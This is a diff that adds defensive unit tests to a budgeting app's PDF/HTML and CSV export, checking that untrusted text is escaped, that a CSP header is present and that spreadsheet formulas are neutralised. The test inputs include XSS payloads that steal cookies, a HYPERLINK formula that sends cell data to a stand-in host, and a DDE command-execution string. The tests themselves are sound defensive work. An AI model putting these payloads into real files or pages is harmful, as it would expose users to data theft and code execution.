@@ -1,3 +1,5 @@
+import csv
+import io
 import unittest
 from datetime import date, timedelta
 from decimal import Decimal
@@ -363,6 +365,106 @@ class ExportPeriodTests(unittest.IsolatedAsyncioTestCase):
 
         # Budi's own private description is visible to Budi
         self.assertIn("Beli Buku", content)
+
+
+# Teks bebas di laporan (nama amplop, emoji, deskripsi, nama anggota) bisa ditulis anggota lain
+# household di amplop bersama, jadi harus dianggap tidak tepercaya di setiap format export.
+XSS_ENV_NAME = '<img src=x onerror="alert(1)">Makan'
+XSS_EMOJI = "<b>"
+XSS_DESC = "<script>alert(document.cookie)</script>Bakso"
+
+
+def _hostile_export_db(*, env_name=XSS_ENV_NAME, emoji=XSS_EMOJI, description=XSS_DESC,
+                       member_name="Siti", owner_id=None, spent=Decimal("25000")):
+    viewer_id = uuid4()
+    other_id = uuid4()
+    user = SimpleNamespace(id=viewer_id, name="Budi", payday_day=1)
+    env_id = uuid4()
+    env = SimpleNamespace(
+        id=env_id, name=env_name, emoji=emoji, budget_amount=Decimal("1000000"),
+        is_rollover=False, is_active=True, owner_id=owner_id, created_at=date(2026, 1, 1),
+    )
+    txn = SimpleNamespace(
+        id=uuid4(), user_id=other_id, envelope_id=env_id, amount=Decimal("25000"),
+        description=description, is_private=False, is_deleted=False,
+        transaction_date=date(2026, 3, 5), source=TransactionSource.webapp,
+    )
+    db = MagicMock()
+    hid_res = MagicMock()
+    hid_res.scalar_one_or_none = MagicMock(return_value=uuid4())
+    env_res = MagicMock()
+    env_res.scalars = MagicMock(return_value=MagicMock(all=MagicMock(return_value=[env])))
+    txn_res = MagicMock()
+    txn_res.all = MagicMock(return_value=[(txn, member_name)])
+    spent_res = MagicMock()
+    spent_res.scalar = MagicMock(return_value=spent)
+    alloc_res = MagicMock()
+    alloc_res.scalar = MagicMock(return_value=Decimal("500000"))
+    db.execute = AsyncMock(side_effect=[hid_res, env_res, txn_res, spent_res, alloc_res])
+    return user, db
+
+
+async def _body(response) -> str:
+    content = ""
+    async for chunk in response.body_iterator:
+        content += chunk if isinstance(chunk, str) else chunk.decode("utf-8", errors="ignore")
+    return content
+
+
+class ExportHtmlInjectionTests(unittest.IsolatedAsyncioTestCase):
+    async def _report_html(self, **kwargs) -> str:
+        user, db = _hostile_export_db(**kwargs)
+        response = await export_pdf(period_start=date(2026, 3, 1), period_end=date(2026, 3, 31), user=user, db=db)
+        return await _body(response)
+
+    async def test_envelope_name_and_emoji_are_escaped(self):
+        html = await self._report_html()
+        self.assertNotIn("<img", html)
+        self.assertNotIn("<b>", html)
+        self.assertIn("&lt;img src=x onerror=&quot;alert(1)&quot;&gt;Makan", html)
+        self.assertIn("&lt;b&gt;", html)
+
+    async def test_transaction_description_is_escaped(self):
+        html = await self._report_html()
+        self.assertNotIn("<script>", html)
+        self.assertIn("&lt;script&gt;alert(document.cookie)&lt;/script&gt;Bakso", html)
+
+    async def test_report_forbids_scripts_and_remote_loads(self):
+        # Pertahanan lapis kedua: berlaku juga saat berkas HTML yang tersimpan dibuka langsung.
+        html = await self._report_html(env_name="Makan", emoji="🍜", description="Bakso")
+        self.assertIn('<meta http-equiv="Content-Security-Policy" content="'
+                      "default-src 'none'; style-src 'unsafe-inline'; img-src data:\">", html)
+
+
+class ExportCsvInjectionTests(unittest.IsolatedAsyncioTestCase):
+    async def _csv(self, **kwargs) -> str:
+        user, db = _hostile_export_db(**kwargs)
+        response = await export_csv(period_start=date(2026, 3, 1), period_end=date(2026, 3, 31), user=user, db=db)
+        return await _body(response)
+
+    async def test_formula_in_description_is_neutralised(self):
+        content = await self._csv(env_name="Makan", emoji="", description='=HYPERLINK("http://x.test/?d="&A1,"klik")')
+        rows = list(csv.reader(io.StringIO(content)))
+        cells = [c for r in rows for c in r]
+        self.assertIn('\'=HYPERLINK("http://x.test/?d="&A1,"klik")', cells)
+        self.assertFalse(any(c.startswith("=") for c in cells))
+
+    async def test_formula_in_envelope_and_member_name_is_neutralised(self):
+        content = await self._csv(env_name="+cmd|' /C calc'!A0", emoji="", description="Bakso",
+                                  member_name="@SUM(1+1)")
+        cells = [c for r in csv.reader(io.StringIO(content)) for c in r]
+        self.assertIn("'+cmd|' /C calc'!A0", cells)
+        self.assertIn("'@SUM(1+1)", cells)
+        self.assertFalse(any(c[:1] in ("=", "+", "@") for c in cells))
+
+    async def test_negative_amounts_and_plain_text_unchanged(self):
+        # Sisa minus (500.000 - 600.000) tetap angka -100000, bukan teks berawalan kutip.
+        content = await self._csv(env_name="Makan", emoji="", description="Bakso - 2 porsi",
+                                  spent=Decimal("600000"))
+        cells = [c for r in csv.reader(io.StringIO(content)) for c in r]
+        self.assertIn("Makan", cells)
+        self.assertIn("Bakso - 2 porsi", cells)
+        self.assertIn("-100000", cells)
 
 
 if __name__ == "__main__":
